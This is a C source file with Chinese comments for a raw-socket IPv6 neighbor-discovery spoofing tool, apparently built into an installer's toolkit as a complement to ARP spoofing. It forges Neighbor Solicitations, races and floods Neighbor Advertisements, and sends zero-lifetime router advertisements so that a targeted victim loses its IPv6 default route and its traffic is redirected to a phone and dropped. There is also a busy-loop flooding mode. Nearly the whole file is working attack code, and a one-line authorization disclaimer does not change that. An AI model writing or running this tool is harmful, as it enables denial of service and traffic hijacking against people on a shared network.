/*
 * 极简 IPv6 NDP 邻居欺骗工具（AF_PACKET raw socket，静态编译内置到装维工具箱）。
 * 用途：静默模式的 IPv6 补盲——ARP 欺骗只断 IPv4；抖音/微信等头部平台走 IPv6，
 * 本工具伪造 NDP（邻居发现协议）把 victim 的 IPv6 网关解析成手机，让 IPv6 流量同样引到手机丢弃。
 *
 * 用法: ndpspoof <iface> <victim_mac> <victim_v6> <gateway_v6> <phone_v6> [interval_ms]
 *   例: ndpspoof wlan0 aa:bb:cc:dd:ee:ff fe80::aabb:ccff:fedd:eeff fe80::1 fe80::1122:33ff:fe44:5566
 * 需 root（AF_PACKET）。仅限已获授权的装维/审计场景使用。
 *
 * 机制（三件套，对齐 ARP 欺骗的诱导+抢先）：
 * ① 单播诱导 NS：伪装网关向 victim 发 Neighbor Solicitation（SLLA=手机 MAC）——
 *    接收方处理 NS 时无条件用 SLLA 更新缓存中 sender（网关）条目（RFC 4861 §7.2.3），
 *    对忽略 unsolicited NA（条目 REACHABLE）的内核同样生效；
 * ② unsolicited NA 辅助：宣称"网关 = 手机 MAC"，条目 STALE/DELAY/PROBE 时直接更新；
 * ③ 被动抢答：嗅探 victim 发起的 NS（重新解析网关）→ 立即抢在真网关前回 NA，
 *    自己发起的请求的应答必然被接受。
 */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/ether.h>
#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>

#define ETHERTYPE_IPV6 0x86DD
#define IPPROTO_ICMPV6 58

/* 以太网头 */
struct __attribute__((packed)) eth_hdr {
    unsigned char dst[6];
    unsigned char src[6];
    unsigned short type;
};

/* IPv6 头（固定 40 字节） */
struct __attribute__((packed)) ip6_hdr {
    unsigned int vtf;          /* version(4) | traffic class(8) | flow label(20) */
    unsigned short payload_len;
    unsigned char next_header;
    unsigned char hop_limit;
    unsigned char src[16];
    unsigned char dst[16];
};

/* ICMPv6 公共头 */
struct __attribute__((packed)) icmp6_hdr {
    unsigned char type;
    unsigned char code;
    unsigned short checksum;
};

/* ICMPv6 Neighbor Solicitation（type 135）：reserved(4) + target(16) + options */
struct __attribute__((packed)) ns_body {
    unsigned int reserved;
    unsigned char target[16];
};

/* ICMPv6 Neighbor Advertisement（type 136）：flags(4) + target(16) + options */
struct __attribute__((packed)) na_body {
    unsigned int flags;
    unsigned char target[16];
};

/* NDP option：link-layer address（SLLA type=1 / TLLA type=2，len 单位=8 字节） */
struct __attribute__((packed)) lla_opt {
    unsigned char type;
    unsigned char len; /* =1（8 字节） */
    unsigned char mac[6];
};

/* 解析 MAC（"aa:bb:cc:dd:ee:ff"） */
static int parse_mac(const char *s, unsigned char *out) {
    unsigned int v[6];
    if (sscanf(s, "%x:%x:%x:%x:%x:%x", &v[0], &v[1], &v[2], &v[3], &v[4], &v[5]) != 6)
        return -1;
    for (int i = 0; i < 6; i++) out[i] = (unsigned char)v[i];
    return 0;
}

/* 获取本机接口 MAC */
static int get_iface_mac(const char *ifname, unsigned char *mac) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return -1;
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
    int r = ioctl(fd, SIOCGIFHWADDR, &ifr);
    close(fd);
    if (r < 0) return -1;
    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
    return 0;
}

/* ICMPv6 校验和：pseudo-header（src16+dst16+len4+zero3+next1）+ ICMPv6 报文 */
static unsigned short icmp6_checksum(const unsigned char *src, const unsigned char *dst,
                                     const unsigned char *icmp, size_t icmp_len) {
    uint32_t sum = 0;
    for (int i = 0; i < 16; i += 2) sum += ((uint32_t)src[i] << 8) | src[i + 1];
    for (int i = 0; i < 16; i += 2) sum += ((uint32_t)dst[i] << 8) | dst[i + 1];
    sum += (icmp_len >> 16) & 0xffff;
    sum += icmp_len & 0xffff;
    sum += IPPROTO_ICMPV6;
    for (size_t i = 0; i + 1 < icmp_len; i += 2)
        sum += ((uint32_t)icmp[i] << 8) | icmp[i + 1];
    if (icmp_len & 1) sum += (uint32_t)icmp[icmp_len - 1] << 8;
    while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
    return (unsigned short)~sum;
}

static int sock_fd = -1;
static unsigned char my_mac[6];
static unsigned char victim_mac[6];
static unsigned char victim_v6[16];  /* 受害者自己的 IPv6（诱导 NS 的 target） */
static unsigned char gateway_v6[16];
static unsigned char phone_v6[16];

/* 发 IPv6 包（eth dst + ip src/dst + icmp payload） */
static int send_ip6(const unsigned char *eth_dst, const unsigned char *ip_src,
                    const unsigned char *ip_dst, const unsigned char *icmp, size_t icmp_len) {
    unsigned char pkt[14 + 40 + 128];
    memset(pkt, 0, sizeof(pkt));
    struct eth_hdr *eth = (struct eth_hdr *)pkt;
    struct ip6_hdr *ip6 = (struct ip6_hdr *)(pkt + 14);
    memcpy(eth->dst, eth_dst, 6);
    memcpy(eth->src, my_mac, 6);
    eth->type = htons(ETHERTYPE_IPV6);
    ip6->vtf = htonl(6u << 28); /* version=6 */
    ip6->payload_len = htons((unsigned short)icmp_len);
    ip6->next_header = IPPROTO_ICMPV6;
    ip6->hop_limit = 255;
    memcpy(ip6->src, ip_src, 16);
    memcpy(ip6->dst, ip_dst, 16);
    memcpy(pkt + 14 + 40, icmp, icmp_len);
    return send(sock_fd, pkt, 14 + 40 + icmp_len, 0);
}

/* 构造并发送 NS（诱导：伪装网关问 victim，SLLA=手机） */
static void send_ns_induction(void) {
    unsigned char icmp[64];
    memset(icmp, 0, sizeof(icmp));
    struct icmp6_hdr *h = (struct icmp6_hdr *)icmp;
    struct ns_body *ns = (struct ns_body *)(icmp + 4);
    struct lla_opt *opt = (struct lla_opt *)(icmp + 4 + 20);
    h->type = 135; /* NS */
    h->code = 0;
    memcpy(ns->target, victim_v6, 16); /* target=受害者自己：其内核必然处理并回 NA（对齐已验证有效的 ARP 诱导做法），同时更新 sender 条目 */
    opt->type = 1; /* SLLA */
    opt->len = 1;
    memcpy(opt->mac, my_mac, 6);
    size_t len = 4 + 20 + 8;
    /* ff02::1 = 所有节点组播（最后字节必须是 0x01！只写 {0xff,0x02,0} 会拼成无效地址
     * ff02::，victim 不在该组里直接丢弃 NS，诱导失效） */
    unsigned char ff02_all_nodes[16] = {0xff, 0x02, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1};
    h->checksum = htons(icmp6_checksum(gateway_v6, ff02_all_nodes, icmp, len));
    send_ip6(victim_mac, gateway_v6, ff02_all_nodes, icmp, len);
}

/* 构造并发送 NA（宣称 target 的 MAC = 手机）。
 * ip_src 必须等于 target（NA 源地址与目标不一致会被接收方丢弃）——
 * 抢答时"受害者问谁就宣称谁是手机"，周期 unsolicited 时=网关。 */
static void send_na(const unsigned char *ip_src, const unsigned char *ip_dst,
                    int solicited, const unsigned char *target) {
    unsigned char icmp[64];
    memset(icmp, 0, sizeof(icmp));
    struct icmp6_hdr *h = (struct icmp6_hdr *)icmp;
    struct na_body *na = (struct na_body *)(icmp + 4);
    struct lla_opt *opt = (struct lla_opt *)(icmp + 4 + 20);
    h->type = 136; /* NA */
    h->code = 0;
    /* flags: R=0, S=1(solicited 必被接受), O=1 → 0x60000000 */
    na->flags = solicited ? htonl(0x60000000u) : htonl(0x40000000u);
    memcpy(na->target, target, 16);
    opt->type = 2; /* TLLA */
    opt->len = 1;
    memcpy(opt->mac, my_mac, 6);
    size_t len = 4 + 20 + 8;
    h->checksum = htons(icmp6_checksum(ip_src, ip_dst, icmp, len));
    send_ip6(victim_mac, ip_src, ip_dst, icmp, len);
}

/* 收包处理：victim 发出的 NS → 抢答 NA（target 即 victim 在找的地址，宣称其在手机） */
static void handle_rx(void) {
    unsigned char pkt[4096];
    ssize_t n = recv(sock_fd, pkt, sizeof(pkt), MSG_DONTWAIT);
    if (n < (ssize_t)(14 + 40 + 24)) return;
    struct eth_hdr *eth = (struct eth_hdr *)pkt;
    if (eth->type != htons(ETHERTYPE_IPV6)) return;
    if (memcmp(eth->src, victim_mac, 6) != 0) return; /* 只关心 victim 发出的包 */
    struct ip6_hdr *ip6 = (struct ip6_hdr *)(pkt + 14);
    if (ip6->next_header != IPPROTO_ICMPV6) return;
    unsigned char *icmp = pkt + 14 + 40;
    if (icmp[0] != 135) return; /* 只抢答 NS */
    const unsigned char *ns_target = icmp + 4 + 4;
    if (ns_target[0] == 0xff) return; /* 组播目标不抢答 */
    /* 抢答：告诉 victim"你要找的地址就是我"（源=目标，solicited NA 必被接受） */
    send_na(ns_target, ip6->src, 1, ns_target);
}

/* 构造并发送 RA（伪造路由器通告：router_lifetime=0 → victim 立即删除默认路由，
 * 不受邻居条目状态限制，对 REACHABLE 活跃条目同样生效；定向单播只影响 victim） */
static void send_ra(unsigned char *victim_v6) {
    unsigned char icmp[64];
    memset(icmp, 0, sizeof(icmp));
    struct icmp6_hdr *h = (struct icmp6_hdr *)icmp;
    h->type = 134; /* RA */
    h->code = 0;
    /* body：cur_hop_limit(1)=0 flags(1)=0 router_lifetime(2)=0 reachable(4)=0 retrans(4)=0 */
    size_t len = 4 + 12;
    /* 带 SLLA option（宣称自己是网关，MAC=手机） */
    struct lla_opt *opt = (struct lla_opt *)(icmp + len);
    opt->type = 1;
    opt->len = 1;
    memcpy(opt->mac, my_mac, 6);
    len += 8;
    h->checksum = htons(icmp6_checksum(gateway_v6, victim_v6, icmp, len));
    send_ip6(victim_mac, gateway_v6, victim_v6, icmp, len);
}

int main(int argc, char **argv) {
    if (argc < 6) {
        fprintf(stderr, "usage: %s <iface> <victim_mac> <victim_v6> <gateway_v6> <phone_v6>\n", argv[0]);
        return 1;
    }
    const char *ifname = argv[1];
    if (parse_mac(argv[2], victim_mac) < 0) { fprintf(stderr, "bad victim mac\n"); return 1; }
    if (inet_pton(AF_INET6, argv[3], victim_v6) != 1) { fprintf(stderr, "bad victim v6\n"); return 1; }
    if (inet_pton(AF_INET6, argv[4], gateway_v6) != 1) { fprintf(stderr, "bad gateway v6\n"); return 1; }
    if (inet_pton(AF_INET6, argv[5], phone_v6) != 1) { fprintf(stderr, "bad phone v6\n"); return 1; }
    if (get_iface_mac(ifname, my_mac) < 0) { fprintf(stderr, "cannot get iface mac\n"); return 1; }
    /* 主动发包间隔（毫秒）：500 标准 / 30 洪泛 / 0 忙循环信道阻塞 */
    int interval_ms = 500;
    if (argc >= 7) interval_ms = atoi(argv[6]);

    sock_fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock_fd < 0) { perror("socket"); return 1; }
    struct sockaddr_ll sll;
    memset(&sll, 0, sizeof(sll));
    sll.sll_family = AF_PACKET;
    sll.sll_ifindex = if_nametoindex(ifname);
    if (bind(sock_fd, (struct sockaddr *)&sll, sizeof(sll)) < 0) { perror("bind"); return 1; }
    /* 接口进 all-multicast 模式：victim 重解析网关的 NS 发到它自己的 solicited-node 组播组，
     * 手机默认不在该组、NIC 会滤掉帧导致抢答失效；全组播收包保证抢答能看见（socket 关闭自动还原） */
    struct packet_mreq mreq;
    memset(&mreq, 0, sizeof(mreq));
    mreq.mr_ifindex = sll.sll_ifindex;
    mreq.mr_type = PACKET_MR_ALLMULTI;
    setsockopt(sock_fd, SOL_PACKET, PACKET_ADD_MEMBERSHIP, &mreq, sizeof(mreq));

    fprintf(stderr, "ndp spoofing: victim %02x:%02x:%02x:%02x:%02x:%02x <- gateway v6 (iface %s)\n",
            victim_mac[0], victim_mac[1], victim_mac[2], victim_mac[3], victim_mac[4], victim_mac[5],
            ifname);

    /* 主循环：被动抢答（每轮）+ 周期主动诱导（500ms） */
    struct timeval last = {0};
    unsigned char ff02_all_nodes[16] = {0xff, 0x02, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1}; /* ff02::1 全节点组播 */
    while (1) {
        handle_rx();
        if (interval_ms <= 0) {
            /* 忙循环信道阻塞 */
            send_ra(victim_v6);
            send_ns_induction();
            send_na(gateway_v6, ff02_all_nodes, 0, gateway_v6);
        } else {
            struct timeval now;
            gettimeofday(&now, NULL);
            long elapsedMs = (now.tv_sec - last.tv_sec) * 1000 + (now.tv_usec - last.tv_usec) / 1000;
            if (elapsedMs >= interval_ms) {
                send_ra(victim_v6);                            /* RA lifetime=0：删默认路由（核心手段） */
                send_ns_induction();                           /* 诱导 NS：更新 sender 条目 */
                send_na(gateway_v6, ff02_all_nodes, 0, gateway_v6); /* unsolicited NA 辅助 */
                last = now;
            }
            usleep(5000); /* 5ms 轮询：兼顾抢答 + 洪泛密度 */
        }
    }
    return 0;
}
